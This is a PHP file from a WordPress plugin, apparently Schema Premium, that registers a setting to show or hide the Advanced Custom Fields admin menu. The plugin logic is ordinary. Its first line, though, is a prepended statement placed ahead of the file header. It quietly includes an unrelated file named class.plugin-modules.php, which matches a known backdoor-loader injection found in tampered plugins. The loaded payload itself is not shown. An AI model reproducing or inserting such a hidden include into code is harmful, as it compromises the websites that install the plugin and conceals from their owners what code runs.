<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
/**
 * ACF admin menua item show/hide
 *
 * @package     Schema
 * @subpackage  Schema - ACF
 * @copyright   Copyright (c) 2018, Hesham Zebida
 * @license     http://opensource.org/licenses/gpl-2.0.php GNU Public License
 * @since       1.0.0
 */

// Exit if accessed directly
if ( ! defined( 'ABSPATH' ) ) exit;

add_action( 'init', 'schema_wp_acf_admin_menu', 100 );
/**
 * ACF admin mneu item show/hide
 *
 * @since 1.0.0
 *
 * return void
 */
function schema_wp_acf_admin_menu() {
	
	$acf_admin_menu_show = schema_wp_get_option( 'acf_admin_menu_show' );
	
	if ( function_exists( 'acf' ) && $acf_admin_menu_show != 'yes' ) {
	// ACF is active, and setting return true!
		
		add_filter('acf/settings/show_admin', '__return_false');
	}
}

add_action( 'admin_init', 'schema_wp_acf_register_admin_menu_setting', 1 );
/*
* Register ACF plugin settings 
*
* @since 1.0.0
*/
function schema_wp_acf_register_admin_menu_setting() {
			
	if ( function_exists( 'acf' ) ) {
	// ACF is active
	
		add_filter( 'schema_wp_settings_advanced', 'schema_wp_acf_admin_menu_setting');
	}
}

/*
* Add ACF plugin settings 
*
* @since 1.0.0
*/
function schema_wp_acf_admin_menu_setting( $settings_advanced ) {
	
	// Display ACF PRO version
	$version = '';
	
	if ( function_exists( 'acf' ) ) {
		$version = acf_get_setting('version'); // may use get_option('acf_version')
	}
	if ($version != '') $version = '(' . $version . ')';
	
	$settings_advanced['main']['acf_admin_menu_show'] = array(
		'id' => 'acf_admin_menu_show',
		'name' => __( 'Enable ACF PRO admin menu?', 'schema-premium' ) . $version,
		'desc' => '',
		'type' => 'select',
		'options' => array(
			'yes'	=> __( 'Yes', 'schema-premium'),
			'no'	=> __( 'No', 'schema-premium')
		),
		'std' => 'no',
		'tooltip_title' => __('When enabled', 'schema-premium'),
		'tooltip_desc' => __('Schema Premium plugin will show Advanced Custom Fields (ACF) admin menu item.', 'schema-premium'),
	);
	
	return $settings_advanced;
}
